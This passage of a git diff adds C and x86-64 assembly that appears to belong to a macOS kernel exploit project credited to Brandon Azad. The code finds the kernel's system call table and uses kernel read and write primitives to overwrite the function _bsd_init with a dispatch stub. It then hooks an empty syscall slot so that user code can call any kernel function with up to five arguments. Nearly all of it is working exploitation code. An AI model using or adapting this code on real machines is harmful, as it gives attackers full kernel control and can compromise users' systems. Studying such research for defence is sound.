+#define _SYSCALL_RET_NONE       0
+#define _SYSCALL_RET_INT_T      1
+#define _SYSCALL_RET_SSIZE_T    6
+#define _SYSCALL_RET_UINT64_T   7
+
+/*
+ * struct syscall_hook
+ *
+ * Description:
+ * 	The state needed to install a system call hook.
+ */
+struct syscall_hook {
+	// The location of the sysent table in kernel memory.
+	uint64_t sysent;
+	// The target function address.
+	uint64_t function;
+	// The original contents of the memory at the target function address.
+	uint64_t *original;
+	// The number of 64-bit words at the start of the target function that were overwritten.
+	size_t count;
+	// The address of _nosys in the kernel.
+	uint64_t _nosys;
+};
+
+/*
+ * struct sysent
+ *
+ * Description:
+ * 	An entry in the system call table.
+ */
+struct sysent {
+	uint64_t sy_call;
+	uint64_t sy_munge;
+	int32_t  sy_return_type;
+	int16_t  sy_narg;
+	uint16_t sy_arg_bytes;
+};
+
+extern int kernel_dispatch(void *p, uint64_t arg[6], uint64_t *ret);
+extern void kernel_dispatch_end(void);
+
+/*
+ * syscall_hook
+ *
+ * Description:
+ * 	The global syscall hook.
+ */
+static struct syscall_hook syscall_hook;
+
+/*
+ * target_function
+ *
+ * Description:
+ * 	The target function that will be overwritten to install the syscall hook.
+ */
+static const char target_function[] = "_bsd_init";
+
+/*
+ * find_sysent
+ *
+ * Description:
+ * 	Find the system call table.
+ */
+static void find_sysent() {
+	// Resolve the various symbols we need.
+	uint64_t _nosys     = kernel_symbol("_nosys")     - kernel_slide;
+	uint64_t _exit      = kernel_symbol("_exit")      - kernel_slide;
+	uint64_t _fork      = kernel_symbol("_fork")      - kernel_slide;
+	uint64_t _read      = kernel_symbol("_read")      - kernel_slide;
+	uint64_t _write     = kernel_symbol("_write")     - kernel_slide;
+	uint64_t _munge_w   = kernel_symbol("_munge_w")   - kernel_slide;
+	uint64_t _munge_www = kernel_symbol("_munge_www") - kernel_slide;
+	// Find the runtime address of the system call table.
+	struct sysent sysent_init[] = {
+		{ _nosys, 0,          _SYSCALL_RET_INT_T,   0,  0 },
+		{ _exit,  _munge_w,   _SYSCALL_RET_NONE,    1,  4 },
+		{ _fork,  0,          _SYSCALL_RET_INT_T,   0,  0 },
+		{ _read,  _munge_www, _SYSCALL_RET_SSIZE_T, 3, 12 },
+		{ _write, _munge_www, _SYSCALL_RET_SSIZE_T, 3, 12 },
+	};
+	uint64_t sysent = kernel_search(sysent_init, sizeof(sysent_init));
+	// Check that the sysent in the kernel matches what we expect.
+	for (unsigned i = 0; i < sizeof(sysent_init) / sizeof(sysent_init[0]); i++) {
+		sysent_init[i].sy_call += kernel_slide;
+		if (sysent_init[i].sy_munge != 0) {
+			sysent_init[i].sy_munge += kernel_slide;
+		}
+	}
+	uint64_t sysent_data;
+	for (unsigned i = 0; i < sizeof(sysent_init) / sizeof(sysent_data); i++) {
+		sysent_data = kern_read(sysent + i * sizeof(sysent_data), sizeof(sysent_data));
+		if (sysent_data != ((uint64_t *)sysent_init)[i]) {
+			FAIL("kernel sysent data mismatch");
+		}
+	}
+	syscall_hook.sysent = sysent;
+	syscall_hook._nosys = _nosys + kernel_slide;
+}
+
+void syscall_hook_install() {
+	if (syscall_hook.sysent == 0) {
+		find_sysent();
+	}
+	uint64_t function = kernel_symbol(target_function);
+	const uintptr_t hook = (uintptr_t)kernel_dispatch;
+	const size_t hook_size = (uintptr_t)kernel_dispatch_end - hook;
+	// Check that the target syscall can be overwritten.
+	uint64_t target_sysent = syscall_hook.sysent + SYSCALL_CODE * sizeof(struct sysent);
+	uint64_t target_sy_call = kern_read(target_sysent + offsetof(struct sysent, sy_call),
+			sizeof(target_sy_call));
+	if (target_sy_call != syscall_hook._nosys) {
+		FAIL("target syscall is not empty");
+	}
+	// Read the original data from the target function.
+	syscall_hook.count = (hook_size + sizeof(uint64_t) - 1) & ~sizeof(uint64_t);
+	syscall_hook.original = malloc(syscall_hook.count * sizeof(uint64_t));
+	if (syscall_hook.original == NULL) {
+		FAIL("malloc failed");
+	}
+	for (unsigned i = 0; i < syscall_hook.count; i++) {
+		syscall_hook.original[i] = kern_read(function + i * sizeof(uint64_t),
+				sizeof(uint64_t));
+	}
+	// Overwrite the target function. We do this first so that if we fail partway through we
+	// don't leave the system with an unstable syscall.
+	for (unsigned i = 0; i < syscall_hook.count; i++) {
+		kern_write(function + i * sizeof(uint64_t), *((uint64_t *)hook + i),
+				sizeof(uint64_t));
+	}
+	// Overwrite the sysent. We do this in reverse order so that if we fail partway through we
+	// don't leave the system with an unstable syscall.
+	struct sysent hook_sysent = {
+		.sy_call        = function,
+		.sy_munge       = 0,
+		.sy_return_type = _SYSCALL_RET_UINT64_T,
+		.sy_narg        = 6,
+		.sy_arg_bytes   = 48,
+	};
+	for (int i = sizeof(hook_sysent) / sizeof(uint64_t) - 1; i >= 0; i--) {
+		kern_write(target_sysent + i * sizeof(uint64_t), *((uint64_t *)&hook_sysent + i),
+				sizeof(uint64_t));
+	}
+	syscall_hook.function = function;
+}
+
+void syscall_hook_remove() {
+	if (syscall_hook.function == 0) {
+		return;
+	}
+	// Replace our sysent hook with an empty sysent.
+	uint64_t target_sysent = syscall_hook.sysent + SYSCALL_CODE * sizeof(struct sysent);
+	struct sysent empty_sysent = {
+		.sy_call        = syscall_hook._nosys,
+		.sy_munge       = 0,
+		.sy_return_type = _SYSCALL_RET_INT_T,
+		.sy_narg        = 0,
+		.sy_arg_bytes   = 0,
+	};
+	unsigned empty_sysent_count = sizeof(empty_sysent) / sizeof(uint64_t);
+	for (unsigned i = 0; i < empty_sysent_count; i++) {
+		kern_write(target_sysent + i * sizeof(uint64_t), *((uint64_t *)&empty_sysent + i),
+				sizeof(uint64_t));
+	}
+	// Replace the original contents of the function we overwrote.
+	for (unsigned i = 0; i < syscall_hook.count; i++) {
+		kern_write(syscall_hook.function + i * sizeof(uint64_t), syscall_hook.original[i],
+				sizeof(uint64_t));
+	}
+	free(syscall_hook.original);
+	syscall_hook.function = 0;
+}
diff --git a/syscall_hook.h b/syscall_hook.h
new file mode 100644
index 0000000..9e740b7
--- /dev/null
+++ b/syscall_hook.h
@@ -0,0 +1,45 @@
+/*
+ * syscall_hook.h
+ * Brandon Azad
+ *
+ * A system call hook allowing arbitrary kernel functions to be called with up to 5 arguments.
+ */
+#ifndef PHYSMEM__SYSCALL_HOOK_H_
+#define PHYSMEM__SYSCALL_HOOK_H_
+
+#include <stdint.h>
+
+/*
+ * syscall_hook_install
+ *
+ * Description:
+ * 	Install a system call hook that allows us to call any function in the kernel with up to 5
+ * 	arguments. The syscall hook should be uninstalled as soon as it is no longer needed.
+ *
+ * Dependencies:
+ * 	kernel_init
+ * 	physmem_init
+ * 	probe_kernel_slide
+ */
+void syscall_hook_install(void);
+
+/*
+ * syscall_hook_remove
+ *
+ * Description:
+ * 	Remove the system call hook. It is safe to call this function even when the syscall hook is
+ * 	not installed.
+ */
+void syscall_hook_remove(void);
+
+/*
+ * kernel_call
+ *
+ * Description:
+ * 	Call the given kernel function with up to 5 arguments.
+ */
+uint64_t kernel_call(uint64_t func,
+		uint64_t arg1, uint64_t arg2, uint64_t arg3,
+		uint64_t arg4, uint64_t arg5);
+
+#endif
diff --git a/syscall_hook.s b/syscall_hook.s
new file mode 100644
index 0000000..0278cc2
--- /dev/null
+++ b/syscall_hook.s
@@ -0,0 +1,66 @@
+/*
+ * syscall_hook.s
+ * Brandon Azad
+ *
+ * x86-64 assembly for kernel_dispatch, the function we will shove into the kernel.
+ */
+#include "syscall_code.h"
+
+#define SYSCALL_CLASS_UNIX      2
+#define SYSCALL_CLASS_SHIFT     24
+#define SYSCALL_CLASS_MASK      (0xFF << SYSCALL_CLASS_SHIFT)
+#define SYSCALL_NUMBER_MASK     (~SYSCALL_CLASS_MASK)
+
+#define SYSCALL_CONSTRUCT_UNIX(syscall_number)                  \
+	((SYSCALL_CLASS_UNIX << SYSCALL_CLASS_SHIFT) |          \
+	 (SYSCALL_NUMBER_MASK & (syscall_number)))
+
+/*
+ * _kernel_dispatch
+ *
+ * Description:
+ * 	 The function we will shove into the kernel to be called by our syscall hook. This function
+ * 	 transfers control to the first syscall argument, passing the remaining five syscall
+ * 	 arguments to the called function.
+ */
+.globl _kernel_dispatch
+.align 4
+_kernel_dispatch:
+	pushq   %rbx
+	movq    %rdx, %rbx
+	movq    (%rsi), %rax
+	shrq    $48, %rax
+	cmpq    $0xffff, %rax
+	jne     _kernel_dispatch_abort
+	movq    %rsi, %rax
+	movq    0x8(%rax), %rdi
+	movq    0x10(%rax), %rsi
+	movq    0x18(%rax), %rdx
+	movq    0x20(%rax), %rcx
+	movq    0x28(%rax), %r8
+	callq   *(%rax)
+	movq    %rax, (%rbx)
+_kernel_dispatch_abort:
+	xorl    %eax, %eax
+	popq    %rbx
+	retq
+
+/*
+ * _kernel_dispatch_end
+ *
+ * Description:
+ * 	A marker for the end of _kernel_dispatch so that we can determine its size.
+ */
+.globl _kernel_dispatch_end
+_kernel_dispatch_end:
+
+.globl _kernel_call
+.align 4
+_kernel_call:
+	pushq   %rbp
+	movq    %rsp, %rbp
+	movl    $ SYSCALL_CONSTRUCT_UNIX(SYSCALL_CODE), %eax
+	movq    %rcx, %r10
+	syscall
+	popq    %rbp
+	retq
